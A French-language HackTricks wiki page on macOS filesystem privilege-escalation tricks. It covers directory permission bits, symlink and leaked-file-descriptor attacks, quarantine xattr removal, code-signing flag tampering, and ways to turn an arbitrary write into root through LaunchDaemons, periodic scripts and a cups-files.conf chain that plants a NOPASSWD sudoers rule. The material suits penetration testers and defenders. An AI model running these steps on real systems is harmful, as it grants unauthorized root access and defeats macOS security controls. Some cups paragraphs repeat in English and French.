# Astuces macOS FS

{{#include ../../../../banners/hacktricks-training.md}}

## Combinaisons de permissions POSIX

Pour un **répertoire**, les trois bits de permission ont une signification différente de celle qu’ils ont sur un fichier ordinaire. `chmod(1)` appelle le bit d’exécution « **search** » lorsqu’il s’applique à un répertoire :<sup>[[2]](#references)</sup>

> `0100` Pour les fichiers, autorise l’exécution par le propriétaire. Pour les répertoires, autorise le propriétaire à **effectuer une recherche** dans le répertoire.

- **read** - vous pouvez **énumérer** les entrées du répertoire (afficher leurs noms).
- **write** - vous pouvez **créer, renommer et supprimer des entrées** dans le répertoire. Notez qu’il s’agit d’une propriété du répertoire *contenant*, et non du fichier : vous pouvez supprimer un fichier que vous ne pouvez ni lire ni modifier, tant que vous pouvez écrire dans son répertoire parent.
  - Pour supprimer un **sous-répertoire**, celui-ci doit être vide, ce qui nécessite à son tour des droits suffisants pour en supprimer tout le contenu.
  - Si le répertoire possède le **sticky bit** (`S_ISVTX`, comme `/tmp`), cette opération est restreinte : POSIX indique alors qu’un processus ne peut supprimer ou renommer les fichiers qu’il contient que s’il est propriétaire du fichier ou du répertoire, ou s’il dispose des privilèges appropriés.<sup>[[1]](#references)</sup>
- **execute / search** - vous êtes **autorisé à parcourir** le répertoire. La résolution des noms de chemin localise chaque composant « dans le répertoire spécifié par son prédécesseur » ; ainsi, **perdre les droits de recherche sur un seul composant du préfixe du chemin rend tout ce qui se trouve en dessous inaccessible par chemin**, même si le fichier feuille est lisible par tous.<sup>[[1]](#references)</sup>

### Combinaisons dangereuses

**Comment écraser un fichier/dossier appartenant à root**, si :

- Le **propriétaire** d’un répertoire parent dans le chemin est l’utilisateur
- Le **propriétaire** d’un répertoire parent dans le chemin est un **groupe d’utilisateurs** disposant d’un **accès en écriture**
- Un **groupe** d’utilisateurs dispose d’un accès en **écriture** sur le **fichier**

Avec l’une des combinaisons précédentes, un attaquant pourrait **injecter** un **sym/hard link** dans le chemin attendu afin d’obtenir une arbitrary write avec privilèges.

### Cas particulier d’un dossier root en R+X

Cela découle directement de la règle de résolution des noms de chemin ci-dessus. Si un **répertoire n’accorde que R+X à root**, les fichiers qu’il contient sont inaccessibles *par chemin* à tous les autres — mais les bits de permission propres aux **fichiers** peuvent tout de même être permissifs. Le répertoire est le seul obstacle.

Ainsi, tout mécanisme permettant de faire sortir le fichier **de ce répertoire** — un processus privilégié qui **déplace/renomme/cop ie** un chemin choisi par l’attaquant vers un emplacement que vous pouvez parcourir — permet une arbitrary read, sans jamais avoir besoin de contourner les permissions propres au fichier :

```bash
# Reproduce the primitive locally
sudo mkdir -p /tmp/locked && sudo chmod 700 /tmp/locked
sudo sh -c 'echo secret > /tmp/locked/data.txt; chmod 644 /tmp/locked/data.txt'

ls -l /tmp/locked/data.txt   # Permission denied: cannot even stat through the directory
cat /tmp/locked/data.txt     # Permission denied

# The file itself is mode 644 - only the parent directory's search bit blocks you.
sudo ls -l /tmp/locked/
```

Recherchez les outils de déplacement de fichiers privilégiés (installateurs, outils de rotation des journaux, collecteurs de rapports de plantage/de diagnostic, fonctionnalités de sauvegarde et d’« export ») qui acceptent un chemin source fourni par un utilisateur moins privilégié.

## Lien symbolique / lien physique

### Fichier/dossier aux permissions permissives

Si un processus privilégié écrit dans un **fichier** qui peut être **contrôlé** par un **utilisateur moins privilégié**, ou qui a pu être **créé auparavant** par un utilisateur moins privilégié, cet utilisateur peut simplement le **faire pointer vers un autre fichier** au moyen d’un lien symbolique ou physique, et le processus privilégié écrira dans ce fichier.

Consultez les autres sections pour découvrir comment un attaquant pourrait **exploiter une écriture arbitraire pour élever ses privilèges**.

### Ouverture avec `O_NOFOLLOW`

Selon [`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html) : *« Si `O_NOFOLLOW` est utilisé dans le masque et que le fichier cible transmis à `open()` est un lien symbolique, alors l’appel à `open()` échouera. »* Seul le **dernier** composant est vérifié : tous les composants **intermédiaires** sont tout de même résolus et suivis. Un développeur qui a « protégé » une écriture avec `O_NOFOLLOW` peut donc encore être attaqué en plaçant un lien symbolique dans un **répertoire parent** du chemin cible.<sup>[[3]](#references)</sup>

La même page de manuel décrit les indicateurs qui corrigent réellement ce problème :<sup>[[3]](#references)</sup>

- **`O_NOFOLLOW_ANY`** — *« si ... un composant quelconque du chemin transmis à `open()` est un lien symbolique, alors l’appel à `open()` échouera. »*
- **`O_RESOLVE_BENEATH`** — *« si ... la résolution du chemin spécifié sort du répertoire associé au FD, alors l’appel à `openat()` échouera. »*

Sinon, les autres moyens d’empêcher les substitutions de liens symboliques dans les composants intermédiaires sont d’utiliser `openat()` relativement à un FD de répertoire déjà validé, ou `realpath()` suivi d’une nouvelle validation.

## .fileloc

Les fichiers ayant l’extension **`.fileloc`** peuvent pointer vers d’autres applications ou binaires : lorsqu’ils sont ouverts, l’application ou le binaire pointé est exécuté.\
Exemple :

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>URL</key>
    <string>file:///System/Applications/Calculator.app</string>
    <key>URLPrefix</key>
    <integer>0</integer>
</dict>
</plist>
```

## Descripteurs de fichier

### Leak FD (no `O_CLOEXEC`)

Si un appel à `open` ne comporte pas le flag `O_CLOEXEC`, le descripteur de fichier sera hérité par le processus enfant. Ainsi, si un processus privilégié ouvre un fichier privilégié puis exécute un processus contrôlé par l’attaquant, ce dernier **héritera du FD donnant accès au fichier privilégié**.

L’exemple canonique est le **LPE `DYLD_PRINT_TO_FILE` dans OS X 10.10** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):<sup>[[4]](#references)</sup>

- `dyld` honorait `DYLD_PRINT_TO_FILE=/path` même dans les **binaires restreints (suid root)**, car cette variable particulière était analysée en dehors de `processDyldEnvironmentVariable()`.
- Il exécutait `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)`, ce qui **créait un fichier appartenant à root à un chemin arbitraire**.
- Le FD n’était **jamais fermé et ne disposait d’aucun flag close-on-exec**, donc chaque processus enfant du binaire suid héritait d’un **FD permettant d’écrire dans un fichier appartenant à root**.
- En exécutant, par exemple, `DYLD_PRINT_TO_FILE=/etc/target suid_binary`, puis en lisant le numéro du FD hérité dans le processus enfant, on pouvait effectuer des écritures arbitraires dans un fichier appartenant à root ; `fcntl(fd, F_SETFL, 0)` permettait même de désactiver `O_APPEND` pour écraser le contenu plutôt que d’ajouter à la suite.

Le même schéma apparaît chaque fois qu’un processus privilégié ouvre un fichier **avant** d’exécuter (`exec`) quelque chose que vous contrôlez (outils auxiliaires, éditeurs de type `crontab` lancés via `$EDITOR`, fichiers de journalisation/de débogage ouverts à partir d’un chemin fourni par une variable d’environnement...). Énumérez les FD dont vous avez hérité avec :

```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```

Tout ce qui est supérieur à 2 et pointe vers un fichier que vous ne pouvez pas ouvrir vous-même constitue une primitive arbitrary-write (ou arbitrary-read).

## Éviter les astuces liées aux xattrs de quarantaine

### Le supprimer

```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```

### indicateur uchg / uchange / uimmutable

Si un fichier ou un dossier possède cet attribut d’immuabilité, il sera impossible d’y ajouter un xattr.

```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```

### Systèmes de fichiers sans prise en charge des xattr

Tous les systèmes de fichiers que macOS peut monter ne stockent pas nativement les **attributs étendus**. HFS+ et APFS le font ; **FAT32, exFAT et (la plupart des montages NFS) ne le font pas** — macOS les émule en écrivant un fichier annexe **AppleDouble** nommé `._<filename>` ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).<sup>[[5]](#references)</sup>

C’est important pour la quarantaine, car le xattr ne persiste que s’il peut effectivement être écrit **et relu** depuis le même volume :

```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```

Si le volume est ensuite lu depuis un chemin qui ignore le fichier compagnon `._` (ou si ce fichier est supprimé), le fichier arrive **sans indicateur de quarantaine** — et un `.app` sans quarantaine suffit à échapper à l’App Sandbox, comme expliqué dans [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute).

### Comportement de writeextattr ACL et de la quarantaine AppleDouble

Pour l’exemple d’ACL `writeextattr`, le mécanisme AppleDouble `com.apple.acl.text` et les étapes de construction et de validation du fichier annexe, voir [AppleDouble/ACL quarantine bypass reproduction](macos-appledouble-acl-quarantine-bypass.md).

## Contourner les vérifications de signature

### Contourner les vérifications des binaires de la plateforme

Certaines vérifications de sécurité contrôlent si le binaire est un **platform binary**, par exemple pour autoriser la connexion à un service XPC. Cependant, comme l’explique cet article sur le contournement, https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/, il est possible de contourner cette vérification en récupérant un platform binary (comme `/bin/ls`) et en injectant l’exploit via dyld à l’aide de la variable d’environnement `DYLD_INSERT_LIBRARIES`.<sup>[[7]](#references)</sup>

### Contourner les indicateurs `CS_REQUIRE_LV` et `CS_FORCED_LV`

Un binaire en cours d’exécution peut modifier ses propres indicateurs pour contourner les vérifications avec un code tel que :<sup>[[7]](#references)</sup>

```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```



## Contourner les signatures de code

Les bundles contiennent le fichier **`_CodeSignature/CodeResources`**, qui contient le **hash** de chaque **fichier** du **bundle**. Notez que le hash de CodeResources est également **intégré à l’exécutable** : nous ne pouvons donc pas le modifier non plus.

Cependant, certains fichiers ne voient pas leur signature vérifiée. Ils ont la clé omit dans le plist, comme ceci :

```xml
<dict>
...
	<key>rules</key>
	<dict>
...
		<key>^Resources/.*\.lproj/locversion.plist$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>1100</real>
		</dict>
...
	</dict>
	<key>rules2</key>
...
		<key>^(.*/index.html)?\.DS_Store$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>2000</real>
		</dict>
...
		<key>^PkgInfo$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>20</real>
		</dict>
...
		<key>^Resources/.*\.lproj/locversion.plist$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>1100</real>
		</dict>
...
</dict>
```

Il est possible de calculer la signature d’une ressource à partir de la ligne de commande avec :

```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```

## Monter des DMG

Un utilisateur peut monter un DMG personnalisé, créé même par-dessus certains dossiers existants. Voici comment créer un paquet DMG personnalisé avec du contenu personnalisé :

```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```

Généralement, macOS monte les disques en communiquant avec le service Mach `com.apple.DiskArbitrarion.diskarbitrariond` (fourni par `/usr/libexec/diskarbitrationd`). Si vous ajoutez le paramètre `-d` au fichier plist de LaunchDaemons et que vous le redémarrez, les journaux seront enregistrés dans `/var/log/diskarbitrationd.log`.\
Cependant, il est possible d’utiliser des outils comme `hdik` et `hdiutil` pour communiquer directement avec l’extension kext `com.apple.driver.DiskImages`.

## Écritures arbitraires

### Scripts shell périodiques

Si votre script peut être interprété comme un **script shell**, vous pourriez écraser le script shell **`/etc/periodic/daily/999.local`**, qui sera exécuté tous les jours.

Vous pouvez **simuler** l’exécution de ce script avec : **`sudo periodic daily`**

### Démons

Écrivez un **LaunchDaemon** arbitraire, par exemple **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**, avec un plist qui exécute un script arbitraire, par exemple :

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
    <dict>
        <key>Label</key>
        <string>com.sample.Load</string>
        <key>ProgramArguments</key>
        <array>
            <string>/Applications/Scripts/privesc.sh</string>
        </array>
        <key>RunAtLoad</key>
        <true/>
    </dict>
</plist>
```

Générez simplement le script `/Applications/Scripts/privesc.sh` avec les **commandes** que vous souhaitez exécuter en tant que root.

### Fichier sudoers

Si vous disposez d'un **arbitrary write**, vous pouvez créer un fichier dans le dossier **`/etc/sudoers.d/`** pour vous accorder des privilèges **sudo**.

### Fichiers PATH

Le fichier **`/etc/paths`** est l'un des principaux endroits qui alimentent la variable d'environnement PATH. Vous devez être root pour le remplacer, mais si un script exécuté par un **processus privilégié** lance une **commande sans chemin complet**, vous pourriez être en mesure de la **hijack** en modifiant ce fichier.

Vous pouvez également écrire des fichiers dans **`/etc/paths.d`** pour ajouter de nouveaux dossiers à la variable d'environnement `PATH`.

### cups-files.conf

Cette technique a été utilisée dans [cet article](https://www.kandji.io/blog/macos-audit-story-part1).<sup>[[8]](#references)</sup>

Créez le fichier `/etc/cups/cups-files.conf` avec le contenu suivant :

```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```

This will create the file `/etc/sudoers.d/lpe` with permissions 777. The extra junk at the end is to trigger the error log creation.

Cela créera le fichier `/etc/sudoers.d/lpe` avec les permissions 777. Le contenu superflu à la fin sert à déclencher la création du journal d'erreurs.

Then, write in `/etc/sudoers.d/lpe` the needed config to escalate privileges like `%staff ALL=(ALL) NOPASSWD:ALL`.

Ensuite, écrivez dans `/etc/sudoers.d/lpe` la configuration nécessaire pour escalader les privilèges, par exemple `%staff ALL=(ALL) NOPASSWD:ALL`.

Then, modify the file `/etc/cups/cups-files.conf` again indicating `LogFilePerm 700` so the new sudoers file becomes valid invoking `cupsctl`.

Puis, modifiez à nouveau le fichier `/etc/cups/cups-files.conf` en indiquant `LogFilePerm 700`, afin que le nouveau fichier sudoers devienne valide en invoquant `cupsctl`.

### Sandbox Escape

Il est possible de s'échapper du sandbox macOS grâce à une écriture arbitraire dans le système de fichiers. Pour quelques exemples, consultez la page [macOS Auto Start](../../../../macos-auto-start-locations.md), mais une méthode courante consiste à écrire un fichier de préférences de Terminal dans `~/Library/Preferences/com.apple.Terminal.plist` qui exécute une commande au démarrage, puis à l'appeler avec `open`.

## Générer des fichiers modifiables en tant qu'autres utilisateurs

Une primitive de privesc très courante consiste à faire en sorte qu'un **processus privilégié crée un fichier pour vous** dans un répertoire que vous contrôlez, puis à conserver **l'accès en écriture** à ce fichier. Deux éléments sont nécessaires :

1. Un répertoire qui vous appartient (ou dans lequel vous pouvez définir une **ACL héritable**), afin que tout ce qui y est créé hérite de vos permissions.
2. Un processus privilégié/`suid` auquel on peut indiquer **où** créer un fichier — généralement par l'intermédiaire d'une variable d'environnement de débogage/journalisation, d'un fichier de configuration ou de l'API XPC d'un helper.

La partie **ACL héritable** permet de rendre le fichier créé modifiable par vous, même s'il appartient à un autre utilisateur. Les flags d'héritage `file_inherit` / `directory_inherit` sont documentés dans [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html):<sup>[[2]](#references)</sup>

```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```

Désormais, tout fichier créé par un processus privilégié dans `$DIRNAME` est **modifiable par vous**. Si ce répertoire est également un emplacement dont le contenu est ensuite **exécuté en tant que root** (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, un répertoire LaunchDaemon...), cela permet une escalade directe vers root. Consultez les sections [Sudoers File](#sudoers-file) et [cups-files.conf](#cups-filesconf) ci-dessus pour savoir quoi écrire une fois que vous avez le fichier.

Pour un exemple complet de la chaîne « une variable d’environnement fait créer un fichier par un processus root, puis le FD fuit jusqu’à vous », consultez [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec) ci-dessus.

## Mémoire partagée POSIX

La **mémoire partagée POSIX** permet aux processus des systèmes d’exploitation conformes à POSIX d’accéder à une zone de mémoire commune, ce qui facilite une communication plus rapide que d’autres méthodes de communication interprocessus. Elle consiste à créer ou à ouvrir un objet de mémoire partagée avec `shm_open()`, à définir sa taille avec `ftruncate()`, puis à le mapper dans l’espace d’adressage du processus à l’aide de `mmap()`. Les processus peuvent ensuite lire et écrire directement dans cette zone mémoire. Pour gérer les accès concurrents et éviter la corruption des données, on utilise souvent des mécanismes de synchronisation tels que des mutex ou des sémaphores. Enfin, les processus défont le mappage et ferment la mémoire partagée avec `munmap()` et `close()`, et peuvent éventuellement supprimer l’objet mémoire avec `shm_unlink()`. Ce système est particulièrement efficace pour une IPC rapide dans les environnements où plusieurs processus doivent accéder rapidement à des données partagées.

<details>

<summary>Exemple de code du producteur</summary>

```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    const char *name = "/my_shared_memory";
    const int SIZE = 4096; // Size of the shared memory object

    // Create the shared memory object
    int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
    if (shm_fd == -1) {
        perror("shm_open");
        return EXIT_FAILURE;
    }

    // Configure the size of the shared memory object
    if (ftruncate(shm_fd, SIZE) == -1) {
        perror("ftruncate");
        return EXIT_FAILURE;
    }

    // Memory map the shared memory
    void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
    if (ptr == MAP_FAILED) {
        perror("mmap");
        return EXIT_FAILURE;
    }

    // Write to the shared memory
    sprintf(ptr, "Hello from Producer!");

    // Unmap and close, but do not unlink
    munmap(ptr, SIZE);
    close(shm_fd);

    return 0;
}
```

</details>

<details>

<summary>Exemple de code consommateur</summary>

```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    const char *name = "/my_shared_memory";
    const int SIZE = 4096; // Size of the shared memory object

    // Open the shared memory object
    int shm_fd = shm_open(name, O_RDONLY, 0666);
    if (shm_fd == -1) {
        perror("shm_open");
        return EXIT_FAILURE;
    }

    // Memory map the shared memory
    void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
    if (ptr == MAP_FAILED) {
        perror("mmap");
        return EXIT_FAILURE;
    }

    // Read from the shared memory
    printf("Consumer received: %s\n", (char *)ptr);

    // Cleanup
    munmap(ptr, SIZE);
    close(shm_fd);
    shm_unlink(name); // Optionally unlink

    return 0;
}

```

</details>

## Descripteurs protégés de macOS

Les **guarded descriptors de macOS** sont une fonctionnalité de sécurité introduite dans macOS afin d’améliorer la sûreté et la fiabilité des opérations sur les **descripteurs de fichiers** dans les applications utilisateur. Ces descripteurs protégés permettent d’associer des restrictions spécifiques, ou « gardes », aux descripteurs de fichiers ; le noyau les applique.

Cette fonctionnalité est particulièrement utile pour prévenir certaines catégories de vulnérabilités, comme les **accès non autorisés aux fichiers** ou les **conditions de concurrence**. Ces vulnérabilités surviennent, par exemple, lorsqu’un thread accède à une description de fichier et **la rend accessible à un autre thread vulnérable**, ou lorsqu’un descripteur de fichier est **hérité** par un processus enfant vulnérable. Voici quelques fonctions liées à cette fonctionnalité :

- `guarded_open_np` : Ouvre un descripteur de fichier avec une garde
- `guarded_close_np` : Le ferme
- `change_fdguard_np` : Modifie les indicateurs de garde d’un descripteur (et peut même supprimer la protection)

## References

- [1] [POSIX.1-2024 — Définitions de base, chap. 4 (Autorisations d’accès aux fichiers, protection des répertoires, résolution des noms de chemin)](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
- [2] [`chmod(1)` page de manuel](https://keith.github.io/xcode-man-pages/chmod.1.html) (directory search/execute bit, ACL inheritance flags)
- [3] [`open(2)` page de manuel](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [4] [SektionEins - Élévation locale de privilèges via DYLD_PRINT_TO_FILE dans OS X 10.10](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (leaked FD without close-on-exec)
- [5] [The Eclectic Light Company - Quels systèmes de fichiers et services cloud préservent les attributs étendus ?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [7] [Mickey (Jhftss) - Une nouvelle ère pour les sandbox escapes de macOS](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [8] [Kandji - Découverte de vulnérabilités Apple : enquête sur les audits de diskarbitrationd et storagekitd, partie 1](https://www.kandji.io/blog/macos-audit-story-part1)
{{#include ../../../../banners/hacktricks-training.md}}
